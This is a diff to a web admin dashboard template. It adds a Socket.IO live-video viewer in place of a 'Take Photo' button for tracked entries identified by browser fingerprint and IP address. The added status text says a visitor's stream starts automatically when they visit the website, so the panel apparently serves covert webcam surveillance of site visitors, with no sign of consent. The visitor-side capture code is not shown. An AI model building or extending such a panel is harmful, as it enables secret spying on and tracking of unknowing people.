@@ -5,6 +5,7 @@
   <title>Admin Dashboard</title>
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
   <style>
     * {
       margin: 0;
@@ -656,7 +657,7 @@
             </div>
             <div class="entry-actions">
               <button class="action-btn view-btn" onclick="viewDetails({{ entry.id }})">View Details</button>
-              <button class="action-btn" onclick="capturePhotoForEntry({{ entry.id }}, '{{ entry.fingerprint }}', '{{ entry.ip_address }}')" style="background: #28a745; color: white;">📷 Take Photo</button>
+              <button class="action-btn" onclick="watchLiveVideo({{ entry.id }})" style="background: #17a2b8; color: white;">📹 Watch Live</button>
               <button class="action-btn delete-btn" onclick="deleteEntry({{ entry.id }})">Delete</button>
             </div>
           </div>
@@ -761,8 +762,119 @@
     </div>
   </div>
 
+  <!-- Modal for live video stream -->
+  <div id="liveVideoModal" class="modal">
+    <div class="modal-content" style="max-width: 800px;">
+      <div class="modal-header">
+        <h2>📹 Live Video Stream - Entry #<span id="liveVideoEntryId"></span></h2>
+        <button class="close-btn" onclick="stopWatchingLiveVideo()">&times;</button>
+      </div>
+      <div style="padding: 20px; background: #000; text-align: center;">
+        <img id="liveVideoFrame" src="" alt="Live Video Stream" style="max-width: 100%; max-height: 600px; display: none;">
+        <div id="liveVideoStatus" style="color: white; padding: 20px;">
+          <div class="spinner" style="display: inline-block; margin-right: 10px;"></div>
+          Connecting to stream...
+        </div>
+      </div>
+    </div>
+  </div>
+
   <script>
     const allData = {{ data | tojson }};
+
+    // WebSocket connection for live video streaming
+    let socket = null;
+    let currentWatchingEntryId = null;
+
+    // Initialize WebSocket connection
+    function initWebSocket() {
+      socket = io();
+      
+      socket.on('connect', () => {
+        console.log('[WEBSOCKET] Connected to server');
+      });
+
+      socket.on('disconnect', () => {
+        console.log('[WEBSOCKET] Disconnected from server');
+      });
+
+      // Receive video frames
+      socket.on('video_frame', (data) => {
+        if (data.entry_id === currentWatchingEntryId) {
+          const img = document.getElementById('liveVideoFrame');
+          const status = document.getElementById('liveVideoStatus');
+          
+          img.src = data.frame;
+          img.style.display = 'block';
+          status.style.display = 'none';
+        }
+      });
+
+      socket.on('watching_stream', (data) => {
+        if (data.entry_id === currentWatchingEntryId) {
+          const status = document.getElementById('liveVideoStatus');
+          if (data.is_active) {
+            status.innerHTML = '<div class="spinner" style="display: inline-block; margin-right: 10px;"></div>Waiting for video stream...';
+          } else {
+            status.innerHTML = '<div style="color: #ffc107;">⚠️ User is not currently streaming. The stream will start automatically when the user visits the website.</div>';
+          }
+        }
+      });
+
+      socket.on('stream_error', (data) => {
+        console.error('[WEBSOCKET] Stream error:', data);
+        const status = document.getElementById('liveVideoStatus');
+        status.innerHTML = '<div style="color: #dc3545;">✗ Error: ' + (data.error || 'Unknown error') + '</div>';
+      });
+    }
+
+    // Watch live video for a specific entry
+    function watchLiveVideo(entryId) {
+      currentWatchingEntryId = entryId;
+      
+      // Initialize WebSocket if not already done
+      if (!socket) {
+        initWebSocket();
+      }
+
+      // Show modal
+      document.getElementById('liveVideoEntryId').textContent = entryId;
+      document.getElementById('liveVideoModal').style.display = 'block';
+      
+      // Reset video frame
+      const img = document.getElementById('liveVideoFrame');
+      const status = document.getElementById('liveVideoStatus');
+      img.style.display = 'none';
+      status.style.display = 'block';
+      status.innerHTML = '<div class="spinner" style="display: inline-block; margin-right: 10px;"></div>Connecting to stream...';
+
+      // Join the viewer room for this entry
+      if (socket) {
+        socket.emit('watch_stream', { entry_id: entryId });
+      }
+    }
+
+    // Stop watching live video
+    function stopWatchingLiveVideo() {
+      if (currentWatchingEntryId && socket) {
+        socket.emit('stop_watching', { entry_id: currentWatchingEntryId });
+      }
+      
+      currentWatchingEntryId = null;
+      document.getElementById('liveVideoModal').style.display = 'none';
+      
+      // Reset video frame
+      const img = document.getElementById('liveVideoFrame');
+      const status = document.getElementById('liveVideoStatus');
+      img.src = '';
+      img.style.display = 'none';
+      status.style.display = 'block';
+    }
+
+    // Initialize WebSocket on page load
+    window.addEventListener('load', () => {
+      initWebSocket();
+    });
 
     // Calculate stats
     const today = new Date().toISOString().split('T')[0];
@@ -1794,8 +1906,14 @@
     // Close modal on outside click
     window.onclick = function(event) {
       const modal = document.getElementById('detailModal');
+      const liveVideoModal = document.getElementById('liveVideoModal');
+      
       if (event.target === modal) {
         closeModal();
+      }
+      
+      if (event.target === liveVideoModal) {
+        stopWatchingLiveVideo();
       }
     };
 
